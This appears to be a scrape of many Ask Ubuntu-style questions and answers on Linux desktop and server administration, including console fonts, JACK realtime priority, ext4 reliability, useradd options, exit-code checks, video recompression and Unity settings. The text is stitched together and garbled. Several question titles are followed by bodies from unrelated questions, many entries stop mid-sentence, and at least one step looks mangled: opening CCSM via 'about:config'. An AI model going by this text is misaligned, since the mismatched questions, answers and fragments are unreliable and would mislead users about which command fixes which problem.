tar cf vmhgfs.tar vmhgfs-only/\n rm -rf vmhgfs-only/\n\nNow restart the installing procedure. It worked for me in Xubuntu 13.04.\nSrc:\nhttp://ubuntuforums.org/showthread.php?t=2136277&page=4&p=12709627#post12709627\n", "Q: How to remove outlines around windows when switching with Alt+Tab?

I type it and nothing happens. The cursor does not move forward. Nor can I type the è (e with grave). This is normally input by typing the backtick followed by an e. I can type the accented é into XTerm as it is a key on the keyboard.\nI know it works because I can input the ` backtick and è etc in Terminal (gnome-terminal). \nI don't want to change the keyboard layout. termcap? terminfo? maybe that has something to do with it ... something is intercepting that backtick ... all other special characters can be input without problem.\nSomeone please help me solve this mystery. I like to use XTerm and I need the backquotes.\n\nA: On foreign keyboards, there are dead keys - of which the backtick is one in languages like French. The standard response - as you mentioned - is to do nothing and present the accented è when an \"e\" is pressed (other letters would be similar).\nI thought that following the backtick by a space would make a backtick appear alone.\nI would check your locale (all LC_* settings) in xterm. I would also check the setting of TERM. You can do these by doing this:\nlocale\nset | grep LC_\necho $TERM\n\nThe first two commands should present the same information.\nI would also expect that gnome-terminal is much more compatible with foreign languages than xterm.\n", "Q: Does the Compiz Cube plugin work with Unity? \nPossible Duplicate:\nHow to correctly enable Desktop Cube in Unity 3D? \n\nI can't currently enable Compiz Cube.

I am apt-get installing Ardour, a sound mixing program, just to try it out. Installing Ardour also installs JACK, a dependency. As part of the JACK installation script, I get the following dialog:\n\nIf you want to run jackd with realtime priorities, the user starting jackd needs realtime permissions. Accept this option to create the file /etc/security/limits.d/audio.conf, granting realtime priority and memlock privileges to the audio group.\nRunning jackd with realtime priority minimizes latency, but may lead to complete system lock-ups by requesting all the available physical system memory, which is unacceptable in multi-user environments.\nEnable realtime process priority?    \n\nI'm installing on my laptop, which never has multiple simultaneous users. I still have concerns: is JACK something that'll be used by the system itself to play any sound (i.e. will it replace ALSA)? If so, does that mean that if I enable realtime priority for JACK, I'll run a slight risk of freezing the machine whenever any sound is played? Or is JACK only going to be used by Ardour for now (until I install some other JACK-dependent program)?\n\nA: One approach to the realtime lockup problem is simply open a bash terminal with a higher priority than jackd. Use your high priority terminal to kill jackd if you see signs of realtime CPU hogging. I used this to avoid total crashes before learning the art of irq fine tuning for pro audio. Steep learning curve, great rewards!\n\nA: Jackd does not normally replace ALSA.  Jackd usually uses ALSA to provide it's output.  What Jackd provides is a low-latency audio patching/routing network that other software can use.  Only software designed to use Jackd will use JackD.  Jackd only needs to be run when you are running software that uses it (e.g. Ardour, Rosegarden, Jack-rack).  When you are not running a program that uses jackd, you don't have to run jackd.\nThe best program I have found for controlling jackd is qjackctl, which can be installed through the Ubuntu Software Center as Jack Control.  It allows starting/stopping jackd, configuring how it is run, and setting up connections.\nIn order to get the lowest latency possible, jackd really would like to use real-time priority threads.  Enabling real-time processing for jackd is good thing to do and should not hurt your system.  (The machine I am typing on right now has had it enabled for 4 years under 2 different Linux distros and 2 different hardware incarnations without any lock-ups.)\nBTW, once you start using some of the features of jackd, it gets pretty addictive.  By starting up different effects racks (jack-rack instances), and setting up the connections, I can take take a stereo recording and create a real-time 4.2 output where I have different delays reverb/delay for the rear speakers, a custom center channel mix, and a sub-woofer output.  (I am still trying to find a good octave doubler for that.)\n", "Q: How to add a custom launcher in Unity's applications place I can drag any .desktop file to the launcher, which is great, but where to put a .desktop file for it to appear in Unity's dash and dash searches?

I have ubuntu-server on my server and also in terminals and an application squeegee in text mode. This version 9.10 of ubuntu-serversystem came with a resolution at the terminal, which makes use of the application, the fonts (letters) are very small. \nPlease, if anyone knows how to take the resolution of text mode 10.04 ubuntu server, tell me. To illustrate. I need the resolution is to get as Debian, large fonts!\nStill using version 9.04, it was the last that still has not implemented the resolution at the terminal (text mode). I remind you that non-use graphical interface. Only text mode.\n\nA: If I understand you correctly, you are arguing about the font size in the virtual terminals (VT), accessible with CTRL + ALT + F[1-6]!?\nThese terminals are configured during the boot process. Depending on your version of Grub you can configure the setup to your preferred solution:\nUsing GRUB1 (0.9) open the file /boot/grub/menu.lst and search for lines that start with kernel /boot/... and add or change vga=xxx. A table with possible values and it's meanings can be found on wikipedia. So your kernel line should look like this:\nkernel /boot/vmlinuz root=/dev/sda1 ro vga=791\n\nPlease take care not to change anything else, otherwise your machine may not boot probably anymore!\nIf you have installed GRUB2 (1.9) the vga parameter became deprecated. Open /etc/default/grub and set the following values:\nGRUB_GFXMODE=1024x768x32\nGRUB_GFXPAYLOAD_LINUX=keep\n\nYou can choose between one of these resolutions: 640×480, 800×600, 1024×768, 1280×1024, 1600×1200.\nTo generate a new config file run the following as root/sudo:\ngrub-mkconfig -o /boot/grub/grub.cfg\n\nIn some curious cases this might not work for you, you can instead also use the deprecated vga version. Add the vga= setting next to the GRUB_CMDLINE_LINUX_DEFAULT= line in your /etc/default/grub, so that this line eg looks like:\nGRUB_CMDLINE_LINUX_DEFAULT=\"quiet splash vga=791\"\n\nIn both cases, GRUB1 or GRUB2 you need to reboot to see the effect of your changes.\n\nA: sudo dpkg-reconfigure console-setup\nEnter, Enter, then pick VGA then a larger size. Then\nsetupcon\n\nA: You can also dynamically change the font size after the system has booted.\nThe simplest way I've found is to pick a font that you like from /usr/share/consolefonts/ and pass it to the setfont command.  Not all the fonts work for me (some say 'KDFONTOP: invalid argument', possibly due to my framebuffer settings), but enough do.  If you want a large font, I'd suggest trying either of these commands to start with:\nsetfont Uni2-Terminus16\nsetfont Uni2-Fixed18\n\nIf you want to make your choice persist through reboots, you'll need to add a command somewhere in your startup scripts.  (.bashrc will work, but you should probably try to think of somewhere better.)\nThe other way is to use the console-setup package.  Type\nsudo dpkg-reconfigure console-setup\n\nto start it asking its questions.  Accept the defaults to start with, and then after about seven or eight questions you'll be asked what font you want on the console.  The font you select here will be stored in the initramfs, so that it will be reloaded automatically next time you boot.\n\nA: cd /usr/share/consolefonts\nls\n\nChoose one file filex and run setfont filex. For example:\nsetfont Uni3-Terminus32x16.psf.gz\n\nAnd that should solve the problem.\n", "Q: Can't add to panel nor delete panel I cannot add any applet to any (top or bottom) panel, cannot delete any panel nor create a new panel.

So that I can roll out stable updates to my ubuntu users.\n\nA: In short, yes. You can add a ppa with the deb (Google does something similar for example).\n", "Q: Software versions of LTS and non-LTS releases synced from Debian I read that LTS releases are based on Debian testing while non-LTS releases are based on Debian unstable. Given the long release cycle of Debian, is it possible for some software to be of a more recent version in a non-LTS release X than in an LTS release X+1?\nIf yes, would there be a difference between doing an upgrade and a fresh install when going from X to X+1?\n\nA: Due to the way the archive works, that doesn't really happen.\nFirst of all, you should know that release n+1 is seeded from release n when it is opened for development. Roughly, this means that release n is copied and renamed to n+1 (there is some tinkering that happens before it is opened for development, but that's not important here). Thus it begins with the same package versions as release n had.\nNow, in order to upload you must use a higher version than was uploaded previously. This means that you cannot 'go backwards'. Even if this were allowed by the archive, the package managers on your system wouldn't consider it to be an upgrade and so you'd keep the 'newer' version.\nIf a package gets taken from unstable in release n and somehow this version never makes it to testing then we will usually stay with the version in unstable for this reason.\nHaving said that, it is possible to hack the version numbers a bit to allow reversions — you may have seen 'foo-1.0+really0.5' versions before — this is a rare way to pretend to the archive and to your package manager that the versions have increased when in fact the upload contains an older version. This is only used as a last resort when a particular version of some software has problems that are so serious that a rollback is the only option. It's far more preferable to just fix the problem directly. Also, this is orthoganal to the release/LTS system — it can happen at any time.\nSo in summary, it's possible to revert packages to a previous version by using package manager hacks, but this isn't generally done.\n", "Q: How can I optimise ext4 for reliability? As ext4 was introduced as more reliable than ext3 with block journals, is there any chance to suppose it 100% reliable? What if enabling block journaling on it, which is disabled by default?\nAs friend's guide to explain my case in more detail:\nI have an embedded linux device, after installation keyboard and monitor is detached and it works standalone.\nMy duty is to make sure it has reliable file-system so with errors there is no way for manual correct faults on device. I can't force my customer to use a ups with each device to ensure no fault by power-failure. \nWhat more can ext4 offer me besides block journaling?\nThanks in advance.\n\nA: A new feature added to ext4 and introduced with kernel 3.5 is what is known as 'metadata checksums', which is another feature of ext4 that is supposed to improve the reliability and the integrity of the structure of the file system.\nThe overall implementation is well explained at Kernel newbies:\n\nModern filesystems such as ZFS and Btrfs have proved that ensuring the integrity of the filesystem using checksums is a valuable feature. Ext4 has added the ability to store checksums of various metadata fields. Every time a metadata field is read, the checksum of the read data is compared with the stored checksums, if they are different it means that the medata is corrupted (note that this feature doesn't cover data, only the internal metadata structures, and it doesn't have \"self-healing\" capabilities).\nAny ext4 filesystem can be upgraded to use checksums using the \"tune2fs -O metadata_csum\" command, or \"mkfs -O metadata_csum\" at creation time. Once this feature is enabled in a filesystem, older kernels with no checksum support will only be able to mount it in read-only mode.\n\nArticles such as this one at kernel.org discuss further in great technical detail how using metadata checksums can prevent corrupted metadata from damaging the file system structure.\nHowever the article also warns that:\n\nThe metadata checksumming code started going into mainline in Linux 3.5, and as of 3.7-rc1 it is undergoing some user testing. This code is not yet rock solid.\n\nIt is not enabled by default in Ubuntu 12.10, and is probably best not to enable it for the moment after the recent issues with the ext4 filesystem, as noted here.\n\nA: No. You can never suppose something to be 100% reliable.\nJournaling file systems minimise data loss in the event of an unexpected outage. Extents and barriers help even more, but cannot eliminate all associated problems. Personally, I've never experienced data loss because of file system corruption when using journaling file systems.\nAlso, journaling is not disabled by default.\nHere's a good overview of ext4 and its improvements: http://kernelnewbies.org/Ext4\n\nA: You could disable delayed allocation under ext4 (nodelalloc), that would make it significantly more likely that you would recover more data if/when you did suffer a power out during a write, but it would come at the cost of more fragmentation of the file system over time.\n", "Q: Why do I still get an older version of Dropbox when downloading the latest one?

No deletions are done until zip has created the archive without errors. This is useful for conserving disk space, but is potentially dangerous so it is recommended to use it in combination with -T to test the archive before removing all input files. \nzip -m yourfile zip.file\n\nA: **for jar extension you can use jar command as the following : \njar -uf file.jar newFile\n\n**OR you can extract file from jar extension as following : \njar -xf file.jar fileToBeExtract \n\nHave Fun :)\n", "Q: How to add a user without /home? I want to create a new user to run a service on the system but don't want to have /home and other configuration files for it.

This can then be verified by using the groups USERNAME or the id USERNAME command.\n\nA: By default the command useradd doesn't create home directories, but for a daemon I recommend you to use the system option and change the shell to a non-existent one so no one can login with said account (in ssh for example):\nsudo useradd -r -s /bin/false USERNAME\n\nYou can see all the options with man useradd and man groupadd if you want to create a group for the user too.\n\nA: try this command:\nsudo useradd vivek\nThis will create a user without creating your home folder at /home/vivek\n\nA: Creating a User without Password with Home directory:\n\nUser & Group\nCreate the desired Group and User with Home-Dir.\nmkdir <HOME-DIR>\nsudo adduser --disabled-password --home <HOME-DIR> --group <GROUP-NAME>\nsudo useradd -s /bin/bash -d <HOME-DIR> -g <GROUP-NAME> <USER-NAME>\n\nPermissions\nsudo chown <USER>:<USER> -R <HOME-DIR>    # Owner permissions\nsudo chmod 775 -R <HOME-PATH>             # Optional\n\nAdd your primary user to the new group (Optional)\nsudo usermod -a -G <GROUP-NAME> <PRIMARY-USER-NAME>\n\nTo see all the groups, use: $ id, $ groups. login to a user: $ sudo su - <USER>.

Why it is not giving me ip address? \nIt is weird that when I work with my wireless there is no problem, it connects auto and the internet is just fine.\n\nA: You didn't mention whether you are using a router or not.  You mentioned it works when you use wireless, which I presume is done through a router.  If you plug into the wired port on the same router, it should work the same way.  If you are not using a router, then it is normal for eth0 to not have an address.  Instead pppoe ( which is a terrible protocol by the way, so if you have a choice, switch to an ISP that doesn't use it ) creates another interface when you \"dial up\" and that interface gets the address.\n", "Q: How to check if a command succeeded? Is there any way to check if there is an error in executing a command?\nExample : \ntest1=`sed -i \"/:@/c connection.url=jdbc:oracle:thin:@$ip:1521:$dataBase\" $search`\nvalid $test1\n\nfunction valid () {\n  if $test -eq 1; then\n    echo \"OK\"\n    else echo \"ERROR\" \n  fi\n}\n\nI already tried do that but it seems it isn't working. I don't how do that. \n\nA: command && echo $? || echo $?\n\n\nA: It should be noted that if...then...fi and &&/|| type of approach deals with exit status returned by command we want to test( 0 on success ); however, some commands don't return  a non-zero exit status if command failed or couldn't deal with input. This means that the usual if and &&/|| approaches won't work for those particular commands.\nFor instance, on Linux  GNU file still exits with 0 if it received a non-existing file as argument and find couldn't locate the file user specified.\n$ find . -name \"not_existing_file\"                                          \n$ echo $?\n0\n$ file ./not_existing_file                                                  \n./not_existing_file: cannot open `./not_existing_file' (No such file or directory)\n$ echo $?\n0\n\nIn such cases, one potential way we could handle the situation is by reading stderr/stdin messages, e.g. those that returned by file command, or parse output of the command like in find. For that purposes, case statement could be used.\n$ file ./doesntexist  | while IFS= read -r output; do                                                                                                                  \n> case \"$output\" in \n> *\"No such file or directory\"*) printf \"%s\\n\" \"This will show up if failed\";;\n> *) printf \"%s\\n\" \"This will show up if succeeded\" ;;\n> esac\n> done\nThis will show up if failed\n\n$ find . -name \"doesn'texist\" | if ! read IFS= out; then echo \"File not found\"; fi                                                                                     \nFile not found\n\n\n( This is a repost of my own answer on related question at unix.stackexchange.com )\n\nA: The return value is stored in $?. 0 indicates success, others indicates error.\nsome_command\nif [ $? -eq 0 ]; then\n    echo OK\nelse\n    echo FAIL\nfi\n\nLike any other textual value, you can store it in a variable for future comparison:\nsome_command\nretval=$?\ndo_something $retval\nif [ $retval -ne 0 ]; then\n    echo \"Return code was not zero but $retval\"\nfi\n\nFor possible comparison operators, see man test.\n\nA: command && echo OK || echo Failed\n\n\nA: As mentioned in many other answers, a simple test of $? will do, like this\nif [ $? -eq 0 ]; then something; fi\n\nIf you want to test if the command failed, you can use a shorter version in bash (but perhaps overkill) as follows:\nif (($?)); then something; fi\n\nThis works by using the (( )) arithmetic mode, so if the command returned success, i.e. $? = 0 then the test evaluates to ((0)) which tests as false, otherwise it will return true.\nTo test for success, you could use:\nif ! (($?)); then something; fi\n\nbut it's already not much shorter than the first example.\n\nA: $? should contain the exit status of the previous command, which should be zero for no error.\nSo, something like;\ncd /nonexistant\nif [ $? -ne 0 ]\nthen\n    echo failed\nelse\n    echo success!\nfi\n\nfor most cases, it's easier to use the && construct to chain commands that need to depend on each other.  So cd /nonexistant && echo success! would not echo success because the command breaks before &&.  The corollary of this is ||, where cd /nonexistant || echo fail would echo fail because cd failed (this becomes useful if you use something like ||exit, which will end the script if the previous command failed).\n\nA: For easier debugging, I make commands to only output errors with:\n\nso [-tag] [commands]\n\nAfter that $? is 0 if success, otherwise failure.\n\nA: If you only need to know if the command succeeded or failed, don't bother testing $?, just test the command directly. E.g.:\nif some_command; then\n    printf 'some_command succeeded\\n'\nelse\n    printf 'some_command failed\\n'\nfi\n\nAnd assigning the output to a variable doesn't change the return value (well, unless it behaves differently when stdout isn't a terminal of course).\nif output=$(some_command); then\n    printf 'some_command succeded, the output was «%s»\\n' \"$output\"\nfi\n\nhttp://mywiki.wooledge.org/BashGuide/TestsAndConditionals explains if in more detail.\n\nA: You can also configure bash to exit if a command fails, useful to avoid checks after every command. Place this at beginning of your script:\nset -e\n\n\nA: Prints the status of the last command\nif [ $? == 0 ]; then echo passed;else echo failed; (exit 1); fi;\nSection echo passed and echo failed can be modified to do whatever you want depending on the status of the last command.\nUsage\necho test # supposed to pass\nif [ $? == 0 ]; then echo passed;else echo failed; (exit 1); fi;\n\n\npassed\n\nblahblah # supposed to fail\nif [ $? == 0 ]; then echo passed;else echo failed; (exit 1); fi;\n\n\nfailed\n\n", "Q: Information about SATA, IDE (PATA) controllers I have a remote computer on which I want to install a new hard drive for rsync backup.

It cannot do it from the CD, however. Windows' boot loader needs to be fixed for it to work.\n\nA: When you install Ubuntu you can tell it to install alongside with the existing operating system this will at least save all your files you have on the other partition.

Using AcetoneISO, the path was /home/user/virtual-drives/1. In case the mount point is not automatically accessed, Acetone can be set to do that: go to File/Options/General options/File manager and select file browser (e.g., Thunar or Nautilus, after having installed them: in Lubuntu/LXDE I do not recommend Nautilus, but Thunar; selecting LXDE in that list seems useless).\n\n", "Q: How can I maximally compress .gz files in Nautilus?

Can I upgrade my VPS to 10.10 or do I need to stay with this version because it seem to be a Xen-specific kernel?\n\nA: Whether or not you \"Can\" (Derek seems to have shown that its possible), its not supported officially.\nTo be sure all of the corner/special cases are handled, what you will need to do is upgrade through the two releases between.. 9.10 and 10.04.. before you get to 10.10.\nThis is pretty simple, just run\nsudo do-release-upgrade\n\nThis will perform all necessary actions to get to 9.10.

Unless you really need something in 10.10, its a decent idea to stop at 10.04, since that way you won't be forced to upgrade for another 4 years from now (its supported for 5, and came out about a year ago).\n\nA: I have a Xen HVM VPS, and I am able to install whatever operating system I want as long as I have the ISO for it.

Gimp is featuring somehow a weird GUI but with a little of patience you will get used to it.\nAnother thing to be considered is that people is more used to the MS style software. Which makes people to lose time trying to do the things \"as they know\", instead of opening their minds to learning.\nI don't think you are going to miss something of Photoshop if you are mind opened to learning, but even if you do, you can install it via PlayOnLinux.

I'm using the gecko-mediaplayer plugin (formerly \"mplayerplug-in\"). The totem plugin was not always working correctly with Opera, and I'm actually depending on the [Copy URL] feature of gecko-mediaplayer.\nHowever that plugin does some inept buffering of videos. It seems to default to 20% caching regardless of what you set in the preferences window. This is quite annoying for big video files. But appearantly it's by design http://groups.google.com/group/gecko-mediaplayer/browse_thread/thread/b7f0f5a3cedc8979\nThe Gentoo forums listed some workaround http://forums.gentoo.org/viewtopic-t-816690.html - but ~/.config/gecko-mediaplayer/gecko-mediaplayer.conf is not working in the Ubuntu version.\nDoes anyone know the actual way to configure the cache= size. Which is the real configuration filename under Ubuntu?\n\nI've now tried that gconf registry, but apps > gecko-mediaplayer > preferenes > cache has no effect either.\n\nA: A quick glance at the source code suggests that the gconf setting is called \"cache_size\" not \"cache\", and that the default value is 2048.\nIf all else fails you could always change it in the plugin source code and rebuild the package. It's on line 280 of src/plugin.cpp.\n\nA: It seems to me that the plugin takes its settings from /apps/gnome-mplayer/preferences (not from gecko-mediaplayer). You can try and change the settings there.\nThere is one problem though - it will only allow you to change the cache_size (overall size of the cache), not the cache_min (the percentage when it starts playing) key, which is probably more interesting for you.\n", "Q: What does the 'Userspace file system' Compiz plugin do? What does this plugin do?\n\nIt does not appear to be possible to enable it using Compiz from the repositories, but I would still like to learn what the plugin does so I can decide whether it might be useful to me.\n\nA: It just maps compiz options to a filesystem using a FUSE mount.

I'm running Ubuntu 10.04.2 LTS Desktop. Being a web developer, naturally I created a \"me.com\" in my /etc/hosts file. Unfortunately, my name resolution is going out to the DNS before first checking my local hosts entry and I can't figure out why.\nThe end result is that if my /etc/resolv.conf contains nameserver 127.0.0.1 in there first, then I get a response back in my web browser from me.com (local) within less than a second. But if I don't have that entry, then my response takes sometimes as much as 5 seconds if my ISP is a little slow.\nThe problem was so troublesome that I actually had to file a question here (and someone resolved it) for how to automatically insert that entry into /etc/resolv.conf.

For mice this tends to get handled by Xorg since most of the time a mouse is used with a GUI unless you are using gpm or something similar. Depending on the underlying driver you can typically install xserver-xorg-input-synaptics or something similar. In order to see whether the device is actually sending events you can run xinput list and then copy the device name and run xinput test 'Device Name in single quotes' to see whether it registers touches/taps/clicks.\nSometimes a particular library doesn't work well with your device and you may need to uninstall a driver (make sure you have a regular USB mouse just in case) or force the device to register with a different driver via Xorg.conf or a file in Xorg.conf.d (there are less options for configuration with Wayland in 18.04 currently).\nYou should also run dmesg and check the output after plugging in the device or you could run dmesg --follow and watch the changes after you plug in the device.

Is there a method which works equally well for different video format (mp4, flv, m4v, mpg, mov, avi)?\nI should mention that most of the videos I would like to compress are downloaded web-videos (mp4, flv), so it's not clear if there is much room for further compression.\n\nA: In the mystical land of the PNG, the most effective way of near-lossless compression is to compress the image with almost every possible combination of settings and compare the output. This is what applications like pngcrush do.\nThere's no reason why a similar process wouldn't work, on paper. In practice, there are a few issues:\n\n\n*\n\n*Compressing video once is already a much longer process than encoding a PNG image.\n\n*There are about 1000 times as many configuration combinations.\n\n*Those two conspire to make the process exponentially longer by several powers.\n\n*It would also use an unreasonable amount of disk space, memory and CPU time.\n\n*Frames blend if there's a framerate change and obviously change if you change the frame size or crop, making comparison process even harder\n\n\nTo top it all off, you're dealing with content that's already poisoned with artefacts and encoding sludge. My simple answer for \"Is there a simple way\" has to be No.\nBut if you have a shed load of low-compression videos like FLV (a fairly rubbish compression in my experience with the format), it might be worth having a go with ffmpeg or mencoder for the FLVs. Something like this might work:\nfind -iname '*.flv' -exec \\\n    mencoder {} -o {}.recomp.avi -ovc x264 -x264encopts threads=9:bitrate=400 -oac mp3lame -lameopts abr:br=52 \\;\n\nBut there will be loss. You just have to judge how much is acceptable.\n\nA: You could also accomplish this with avconv based on\navconv -i <sourcefile> -c:v libx264 -crf 23 output.mp4\nyou can adjust the quality upwards by reducing the crf factor (23 in the example) and adjust downwards by increasing it.\nYou can set the values between 0 and 51, where lower values would result in better quality (at the expense of higher file sizes). Sane values are between 18 and 28. The default for x264 is 23, so you can use this as a starting point.\nA script that should allow you to change to a different format with no loss of quality (but little or no reduction in size would be \n#!/bin/bash\necho \"This script will attempt to copy the video and audio streams of all non-mkv files in the current directory to a mkv video container of the same name as the sources without overwriting.\"\nread -p \"Press any key to continue or CTRL-C to cancel\"\n\nfor f in *.* \n    do\n    name=$(echo \"$f\" | sed 's/\\.[^\\.]*$//')\n    ext=$(echo \"$f\" | sed 's/^.*\\.//')\n    echo \"$f is made up of the base $name and ends with $ext\"\n    target=\"$name.mkv\"\n    echo target = $target\n        if  [ \"$f\" = \"$target\" ];\n        then\n            echo \"$f=$target skipping overwrite\"\n        else \n            avconv -i \"$f\" -c:a copy -c:v copy \"$name.mkv\"\n        fi\n    done\n\nNote that the audio and video codecs in use in this script are copy so no re-encoding should take place. Any savings in size will be minimal and will only be the result of a more efficient container than previously in use. To obtain a reduction in size, re-encoding is required and you'd need to adjust the script by replacing c:v copy with -c:v libx264 -crf 23 (adjusting the -crf value to your needs as mentioned above). Feel free to comment out or remove any superfluous echo lines.\nNote: The formats you mention \"mp4, flv, m4v, mpg, mov, avi\" are containers and have little or no bearing on the codecs used to encode the streams within them. A discussion regarding re-encoding for size reduction would require knowledge of the codecs contained in the containers and would have to be evaluated on a case by case basis.\nSources: Testing and http://slhck.info/articles/crf\n", "Q: How to enable Nautilus mounted remote shares in a file system dialog I can see the remote share from nautilus and browse to it.

In your case, I'm thinking it could mount the drive somewhere and perform whatever sync features you need.\nI've already written how to write a simple udev script so I'll just point you there.\nFor the actual synchronisation, you need something else. git is a very popular version control application that you could easily twist to your will. And there are standard backup options like rsync that you can have it merge conflicts (just not as well as something like git).\n\nA: You could try making a file called .autorun in the root directory of your usb drive, and make the contents the command you want to run, like /usr/bin/rsync -av /dir/you/want/to/sync /place/to/sync/to.\n", "Q: How do I reset the thumbnail cache?

I have spent about 7 years looking for an option and, well, this is the only one right now. The only other way would be for IBM to release the source for opening SAM files and that would help in bringing many MANY medics, accountants, architects and others that have their research in SAM format to a new format. Just in my case I changed around 16000+ in medical documents from SAM to ODT and about 10000+ for other areas.\nNOTE - I have checked as accepted until a better (Cost Free solution) comes out that works with no problems like the one I mention here.\n", "Q: How do I enable font anti-aliasing in Wine?

Install the CompizConfig Settings Manager (ccsm) from the Software Centre, and look under the desktop section for Unity options. \nUnity 2D settings can be configured with a tool available here:\nA simple GUI for Unity-2D Settings (Ubuntu 11.04) | Mariano Chavero\n\nA: Ubuntu 12.04\noverview\nThe default configuration option installed as standard is User Interface.\nThere are three further unity configuration options used in this answer that can be installed:\n\n\n*\n\n*MyUnity\n\n*dconf-editor\n\n*ccsm\nNote: In previous answers, the utility CCSM was extensively used as the primary configuration tool.  The use of this tool is strongly not recommended and can break your desktop.  In this answer, CCSM is only used where the other tools do not offer the configuration options discussed.\nNote that some changes only appear after logging out and in again (i.e. restarting X).\nUser Interface\n\n\n*\n\n*Hit the Dash and search for appearance\n\nFrom the Appearance tab you can configure the:\n\n\n*\n\n*wallpaper\n\n*theme\n\n*size of the launcher icons\n\n\n\nFrom the Behaviour tab you can configure the:\n\n\n*\n\n*how to invoke the launcher by moving the mouse (hot-spot) - either left-side of the screen or the top-left corner\n\n*how quickly the launcher is revealed - lower the slide bar, the longer the mouse needs to be at the hot-spot to be revealed.\n\n\nMyUnity\n\n\n*\n\n*Hit Alt+F2 and type myunity and hit enter.\n\n\nYou can now configure quite a few different settings, like the launcher behavior, dash configuration, panel transparency, desktop icons and various font settings.\nLauncher\n\n\n\n*\n\n*color - Launcher background color\n\n*size - Launcher icon size  \n\n*Transparency - Background transparency of the launcher\n\n*Show devices - Show removable USB drives as an icon\n\n*Behavior - How the launcher interacts with windows\n\n\n*\n\n*Fixed - The launcher will never hide.\n\n*Hidden - The launcher will hide when a window would overlay it.\n\n\n*Display - What effect the launcher should use when hiding i.e. to fade away or to slide (or both)\n\n*Backlights - Style of icon background\n\n\n*\n\n*Icons On - the icon back light will always be on.\n\n\n\n\n\n\n*\n\n*Active Icons On - the icon back light will be on as long as the application is running.\n\n\n\n\n\n*\n\n*Icons Off - No backlights on icons\n\n\n\n\n\n*\n\n*Only Icons Edge - the edge illumination  will be on as long as the application is running.\n\n\n\nLauncher Quicklists\n\nThis option allows you to create quicklists - quicklists are a submenu that are displayed when you right-click a launcher icon.\nFor example - shutter\n\nDash\n\n\n\n*\n\n*Display available apps - control whether similar applications from the software center should be displayed\n\n*Display recent apps - control whether applications you have recently used should be displayed\n\n*Blur - how or if Dash background is displayed - default is to blur the background\n\n\n*\n\n*Off - No Blur\n\n*Smart - Active Blur - This means it actively blurs what is behind it. \n\n*On - snapshot of the desktop that doesn't get updated (in cases where the drivers can't handle it)\n\n\n*Dash Size - whether the dash shows in netbook or desktop style depending on the screen resolution\nPanel\n\n\n\n*\n\n*Transparency - how transparent the top-panel should be displayed\n\n*Transparency Maximized Toggle - if you are using a transparent top-panel this toggle controls whether an application that is maximised has its decoration also displayed transparently or in the theme colour.\n\n\nDesktop\n\n\n\n*\n\n*This tab determines whether the icons shown in the image appears on the desktop\n\n*Window animation - whether the launch and minimize window effect is displayed or not\n\n*v desktop & h desktop - controls the number of vertical and horizontal workspaces (default 2x2)\n\n\nFonts\n\n\n\n*\n\n*Font antialiasing - how smooth the fonts are displayed\n\n*Font hinting - adjust the display of the outline font\n\n*System/Document/Desktop/Window Title/Monospace - change the font for the desktop type\n\n\nThemes\n\nAny themes that you have installed or manually installed (/usr/share/themes or ~/.themes) together with manually installed icons (/usr/share/icons or ~/.icons) can be chosen.\nConfiguration Editor (dconf-editor)\nWhere an option is not described, then this functionality can be achieved through MyUnity described above.\n\n\n*\n\n*Open up the Configuration Editor by pressing Alt + F2 and typing dconf-editor\n\n*Navigate to Desktop -> Unity to find the options below:\n\n\n*\n\n*home-expanded - Whether the home screen of the Dash should be expanded (Expanded) or not (Not Expanded).\n\n*sub-key Dash - home-lens-ordering - List of lens ids specifying how lenses should be ordered in the Dash home screen.\n\n*sub-key Devices - favorites - List of device uuid for favorites on the launcher.\n\n*sub-key Launcher - favorites - list of icons (their .desktop names) shown by default on the launcher\n\n*sub-key Panel - systray-whitelist - List of client names, resource classes or wm classes to allow in the Panel's systray implementation.

But it doesn’t support the installation of new themes.\nWith Unsettings you can switch off the global menu and the overlay scrollbars used in Unity.\nIn addition to just applying the settings Unsettings lets you to save your settings into and load from a text file (JSON format) so you can easily backup you settings or copy them to a different account.\nUnsettings is available for Ubuntu 11.10 and later.\n\nA: Ubuntu 12.10\noverview\nThe default configuration option installed as standard is User Interface.\nThere are three further unity configuration options used in this answer that can be installed:\n\n\n*\n\n*Ubuntu Tweak\n\n*dconf-editor\n\n*ccsm\nNote 1: In previous answers, the utility CCSM was extensively used as the primary configuration tool.

tools. From now, he is in italian, but I think that english translation will come sooner.\nNow available in English, refer to OMG!Ubuntu article from December 11.\n\nA: There is an unofficial Compiz plugin that allows you to move the Unity launcher to the bottom (looks out of place and ugly there in my opinion). \nMore information about it at:\nHow To Move Unity Launcher To The Bottom Of The Screen [Ubuntu 11.10 Oneiric Ocelot] ~ Web Upd8: Ubuntu / Linux blog\n\nPersonally would wait for an official plugin for this but if you are feeling feisty...\nUse at your own risk.\n\nA: Ubuntu 11.10\n\nThis answer has been written taking this as base and modifying it for Ubuntu 11.10\n\nThere are two options to edit the settings. Either using the CompizConfig Settings Manager (ccsm) or the dconf-editor. \nNote that (some?) changes only appear after logging out and in again (i.e. restarting X).\nCompizConfig Settings Manager\n\n\n*\n\n*Warning: CCSM is in universe and not shipped by default for a reason, it can be flaky, so be careful in there, it can break things, if you find yourself with a broken window manager, see this question to reset your configuration.\n\n*Install the CompizConfig Settings Manager \n(Click the link)\n\n*Hit Alt+F2 and type about:config and hit enter.\nYou can now configure quite a few different settings, like key shortcuts, the launcher behavior and appearance of the Launcher.\nOn the Behaviour tab you can configure:\n\n\n\n*\n\n*The Reveal Mode sets from which edge the launcher will reveal. \n\n\n\n\n\n*\n\n*The Edge Reveal Timeout sets the waiting time (in ms) before the launcher is revealed when a window is touching the edge.\n\n*The Hide Launcher sets the launchers hide behavior.\n\n\n*\n\n*Never - The launcher will never hide.\n\n*Autohide - The launcher will hide automatically based on time.\n\n*Dodge Windows - The launcher will hide when a window would overlay it.\n\n*Dodge Active Window - The launcher will hide only when an active window would overlay it.\n\n\n*The key to show the launcher which by default is the Super key. This will also affect the key used to show the dash (if tapped) and the shortcuts shown when keeping Super pressed.\n\n*The key to put keyboard-focus on the launcher so you can navigate using your keyboard (default Alt + F1).\n\n*The key to open a Search Command dash where you can enter a command name you want to execute. (dafault Alt + F2).\n\n*The key to open the first panel menu (default F10).\nOn the Switcher Tab:\n\n\n\n*\n\n*Automatically grid windows on timer in switcher: Turn this off if you want don't want to automatically expand multiple windows in alt-tab.\n\n*Bias alt-tab sorting to prefer windows on the current viewport: Select this if you want alt tab to prioritize the order in which applications are shows in alt-tab. Applications in your current workspace are listed first.\nOn the Experimental tab (might change hence the name):\n\n\n\n*\n\n*The Backlight Mode sets how the icons are 